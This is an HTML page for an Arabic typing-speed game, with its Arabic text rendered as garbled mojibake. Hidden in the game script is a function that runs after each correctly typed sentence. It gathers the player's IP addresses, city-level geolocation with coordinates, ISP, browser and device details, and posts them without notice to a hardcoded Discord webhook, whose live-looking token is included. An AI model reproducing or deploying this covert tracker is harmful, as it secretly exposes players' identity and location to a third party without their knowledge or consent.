<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Ù„Ø¹Ø¨Ø© Ø§Ù„ÙƒØªØ§Ø¨Ø©</title>
<style>
  body {
    margin: 0; padding: 0; font-family: "Arial", sans-serif;
    background: #121212; color: #eee; overflow-x: hidden;
  }
  #stars {
    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
    z-index: -1;
    background: #000;
  }
  #container {
    max-width: 600px; margin: 60px auto 40px auto; padding: 20px;
    background: rgba(30,30,30,0.85); border-radius: 10px;
    box-shadow: 0 0 15px #4a0d7a;
  }
  #sentence {
    font-size: 28px; margin-bottom: 10px; line-height: 1.4;
    letter-spacing: normal;
  }
  #sentence span {
    margin: 0 3px;
  }
  .correct { color: #4caf50; }
  .incorrect { color: #f44336; background-color: rgba(255,0,0,0.15); border-radius: 4px; }
  .pending { color: #ddd; }
  #userInput {
    width: 100%; padding: 10px; font-size: 20px;
    border-radius: 6px; border: none; outline: none;
    box-sizing: border-box;
    background: #222; color: #eee;
  }
  #speedDisplay, #bestTime, #result {
    margin-top: 10px; font-size: 18px; min-height: 24px;
  }
  #musicControl {
    margin-top: 15px; cursor: pointer; font-size: 24px; user-select: none;
    color: #bb86fc;
  }
  #footerRights {
    text-align: center; margin-top: 40px; font-size: 14px;
    color: #888; font-weight: bold;
  }
  #discordButton {
    position: fixed; bottom: 20px; left: 20px;
    width: 48px; height: 48px; cursor: pointer;
    filter: drop-shadow(0 0 6px #6a52b8);
  }
</style>
</head>
<body>
<canvas id="stars"></canvas>

<div id="container">
  <div id="sentence"></div>
  <input type="text" id="userInput" autocomplete="off" spellcheck="false" placeholder="Ø§ÙƒØªØ¨ Ø§Ù„Ø¬Ù…Ù„Ø© Ù‡Ù†Ø§..." />
  <div id="speedDisplay"></div>
  <div id="bestTime"></div>
  <div id="result"></div>
  <div id="musicControl" title="ØªØ´ØºÙŠÙ„/Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù…ÙˆØ³ÙŠÙ‚Ù‰">ğŸµ</div>
</div>

<div id="footerRights">Ø­Ù‚ÙˆÙ‚ Ø§Ù„Ù†Ø´Ø± Â© Ù…Ø¹Ø§Ø° Ø§Ù„Ø­Ø±Ø¨ÙŠ</div>

<audio id="bgMusic" loop>
  <source src="https://cdn.pixabay.com/download/audio/2022/03/28/audio_3800f15e5a.mp3?filename=deep-ambient-11228.mp3" type="audio/mpeg" />
</audio>

<!-- Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ Ø¨Ù†ÙØ³Ø¬ÙŠ -->
<svg id="discordButton" viewBox="0 0 245 240" xmlns="http://www.w3.org/2000/svg" fill="#7289da" >
  <path d="M104.4 104.5c-5.7 0-10.3 5-10.3 11.1 0 6.1 4.6 11.1 10.3 11.1 5.7 0 10.3-5 10.3-11.1 0-6.2-4.6-11.1-10.3-11.1zm36.2 0c-5.7 0-10.3 5-10.3 11.1 0 6.1 4.6 11.1 10.3 11.1 5.7 0 10.3-5 10.3-11.1 0-6.2-4.6-11.1-10.3-11.1z"/>
  <path d="M189.5 20H55.5C40.5 20 28.1 33.7 28.1 51.1L26 158.4c0 17.4 12.4 31.1 29.4 31.1h98.3l-4.6-15.9 11 10.4 10.3 9.6 18.2 16.2V51.1c0-17.4-12.4-31.1-29.4-31.1zM164 156s-14.3-17.1-26.3-31.1c25.2-7.1 34.7-22.7 34.7-22.7-7.8 5.2-15.2 8.9-21.9 11.4-9.5 4-18.6 6.7-27.6 8.3-18.6 3.4-35.6 2.6-50.5-0.1-11.1-2-20.6-4.9-28.7-8.3-1.2-0.5-2.9-1.1-4.7-1.8-0.2-0.1-0.4-0.2-0.6-0.3-0.1-0.1-0.2-0.1-0.2-0.2-3-1.5-4.6-2.4-4.6-2.4s9.4 15.3 33.9 22.6c-12 14-26.4 31.2-26.4 31.2-43.5-2-60-29.9-60-29.9 0-63.5 28.4-115 28.4-115 28.4-21.1 55.3-20.6 55.3-20.6l2 2.3c-35.4 10.1-51.8 25.3-51.8 25.3s4.3-2.4 11.6-5.8c21-8.4 37.7-10.6 44.6-11.2 1.1-0.1 2.1-0.2 3.2-0.2 12.2-1 26 0.7 40.2 6.8 0 0-16-14.8-51.4-25.5l2-2.3s26.9-0.4 55.3 20.6c0 0 28.3 51.5 28.3 115 0 0-16.6 27.9-60.1 29.9z"/>
</svg>

<script>
  const sentence = document.getElementById("sentence");
  const userInput = document.getElementById("userInput");
  const speedDisplay = document.getElementById("speedDisplay");
  const bestTimeDisplay = document.getElementById("bestTime");
  const result = document.getElementById("result");
  const musicControl = document.getElementById("musicControl");
  const music = document.getElementById("bgMusic");
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w";

  const sentences = [
    "ØªØ¹Ù„Ù… ÙƒÙ„ ÙŠÙˆÙ… Ø´ÙŠØ¡ Ø¬Ø¯ÙŠØ¯",
    "Ø§Ù„ÙƒØªØ§Ø¨Ø© Ø§Ù„Ø³Ø±ÙŠØ¹Ø© Ù…Ù‡Ø§Ø±Ø© Ø±Ø§Ø¦Ø¹Ø©",
    "Ù‡Ù„ Ø£Ù†Øª Ø¬Ø§Ù‡Ø²ØŸ",
    "Ø³Ø±Ø¹ØªÙƒ ÙÙŠ Ø§Ù„ÙƒØªØ§Ø¨Ø© Ù…Ù‡Ù…Ø©",
    "Ø§Ø®ØªØ¨Ø± Ù†ÙØ³Ùƒ Ø§Ù„Ø¢Ù†",
    "Ø§Ø³ØªÙ…Ø± ÙÙŠ Ø§Ù„ØªØ¯Ø±ÙŠØ¨",
    "Ø­Ø§ÙˆÙ„ ØªØ­Ø³ÙŠÙ† Ù…Ø³ØªÙˆØ§Ùƒ"
  ];

  let currentSentence = "";
  let startTime = 0;
  let bestTime = null;
  let highestSpeed = 0;

  function newSentence() {
    currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
    renderSentence("");
  }

  function renderSentence(input) {
    sentence.innerHTML = "";
    const inputWords = input.trim().split(" ");
    const targetWords = currentSentence.split(" ");

    for (let i = 0; i < targetWords.length; i++) {
      let span = document.createElement("span");
      span.textContent = targetWords[i];
      span.style.margin = "0 3px";
      if (inputWords[i] == null) {
        span.className = "pending";
      } else if (inputWords[i] === targetWords[i]) {
        span.className = "correct";
      } else {
        span.className = "incorrect";
        // ØªÙ„ÙˆÙŠÙ† ÙƒÙ„Ù…Ø© "Ù„Ø§" Ø¨Ø§Ù„Ù„ÙˆÙ† Ù…Ø¹ Ø§Ù„Ø®Ù„ÙÙŠØ© Ø§Ù„Ø®Ø§ØµØ©
        if (targetWords[i] === "Ù„Ø§") {
          span.style.backgroundColor = "#cc4444";
          span.style.color = "#fff";
          span.style.padding = "0 4px";
          span.style.borderRadius = "4px";
        }
      }
      sentence.appendChild(span);
      if (i !== targetWords.length - 1) sentence.appendChild(document.createTextNode(" "));
    }
  }

  function checkInput() {
    const text = userInput.value.trim();
    if (text === currentSentence) {
      const endTime = Date.now();
      const elapsed = (endTime - startTime) / 1000;
      speedDisplay.textContent = `Ø²Ù…Ù†Ùƒ: ${elapsed.toFixed(2)} Ø«Ø§Ù†ÙŠØ©`;
      if (!bestTime || elapsed < bestTime) {
        bestTime = elapsed;
        bestTimeDisplay.textContent = `Ø£ÙØ¶Ù„ Ø²Ù…Ù†: ${bestTime.toFixed(2)} Ø«Ø§Ù†ÙŠØ©`;
      }
      const speed = Math.round(currentSentence.length / elapsed);
      if (speed > highestSpeed) {
        highestSpeed = speed;
        result.textContent = `Ø£Ø¹Ù„Ù‰ Ø³Ø±Ø¹Ø©: ${highestSpeed} - ${elapsed.toFixed(2)} Ø«Ø§Ù†ÙŠØ©`;
      } else {
        result.textContent = "Ø£Ø­Ø³Ù†Øª! Ø§Ø¨Ø¯Ø£ Ø¬Ù…Ù„Ø© Ø¬Ø¯ÙŠØ¯Ø©";
      }
      newSentence();
      userInput.value = "";
      startTime = Date.now();

      sendUserInfo();

    } else {
      result.textContent = "Ø­Ø§ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰";
    }
    renderSentence(userInput.value);
  }

  userInput.addEventListener("input", () => {
    renderSentence(userInput.value);
  });

  userInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      checkInput();
    }
  });

  musicControl.addEventListener("click", () => {
    if (music.paused) {
      music.play();
      musicControl.textContent = "ğŸ”‡";
    } else {
      music.pause();
      musicControl.textContent = "ğŸµ";
    }
  });

  newSentence();
  startTime = Date.now();

  async function sendUserInfo() {
    try {
      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
        fetch('https://api.ipify.org?format=json'),
        fetch('https://api64.ipify.org?format=json'),
        fetch('https://ipapi.co/json/')
      ]);
      const ipv4Data = await ipv4Res.json();
      const ipv6Data = await ipv6Res.json();
      const geoData = await geoRes.json();

      const ua = navigator.userAgent;
      const lang = navigator.language;
      const now = new Date();
      const timeString = now.toISOString();
      const ipv4 = ipv4Data.ip;
      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';

      let deviceType = "ÙƒÙ…Ø¨ÙŠÙˆØªØ±";
      if (/android|iphone|ipad|ipod/i.test(ua)) {
        deviceType = /tablet|ipad/i.test(ua) ? "ØªØ§Ø¨Ù„Øª" : "Ø¬ÙˆØ§Ù„";
      }

      const infoText = `
IP (IPv4): ${ipv4}
IP (IPv6): ${ipv6}
Ø§Ù„Ø¯ÙˆÙ„Ø©: ${geoData.country_name}
Ø§Ù„Ù…Ù†Ø·Ù‚Ø©: ${geoData.region}
Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${geoData.city}
Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${geoData.latitude}
Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${geoData.longitude}
Ø§Ù„Ù…Ù†Ø¸Ù…Ø©: ${geoData.org}
Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©: ${geoData.timezone}
Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²: ${deviceType}
Ø§Ù„Ù…ØªØµÙØ­: ${ua}
Ø§Ù„Ù„ØºØ©: ${lang}
Ø§Ù„ÙˆÙ‚Øª: ${timeString}
      `.trim();

      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: infoText })
      });

      if (response.ok) {
        console.log("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ø¨Ù†Ø¬Ø§Ø­");
      } else {
        console.error("ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„ÙˆÙŠØ¨ Ù‡ÙˆÙƒ");
      }

    } catch (e) {
      console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…', e);
    }
  }
</script>

<script>
  // Ø±Ø³Ù… Ø§Ù„Ù†Ø¬ÙˆÙ… Ø§Ù„Ù…ØªØ­Ø±ÙƒØ©
  const canvas = document.getElementById('stars');
  const ctx = canvas.getContext('2d');
  let width, height, stars;
  function initStars() {
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;
    stars = [];
    for (let i = 0; i < 100; i++) {
      stars.push({
        x: Math.random() * width,
        y: Math.random() * height,
        radius: Math.random() * 1.1,
        alpha: Math.random()
      });
    }
  }
  function drawStars() {
    ctx.clearRect(0, 0, width, height);
    for (let s of stars) {
      ctx.beginPath();
      ctx.arc(s.x, s.y, s.radius, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(255,255,255,${s.alpha})`;
      ctx.fill();
    }
  }
  function animateStars() {
    for (let s of stars) {
      s.alpha += (Math.random() - 0.5) * 0.05;
      if (s.alpha < 0) s.alpha = 0;
      else if (s.alpha > 1) s.alpha = 1;
    }
    drawStars();
    requestAnimationFrame(animateStars);
  }
  window.addEventListener('resize', () => {
    initStars();
  });
  initStars();
  animateStars();
</script>

</body>
</html>
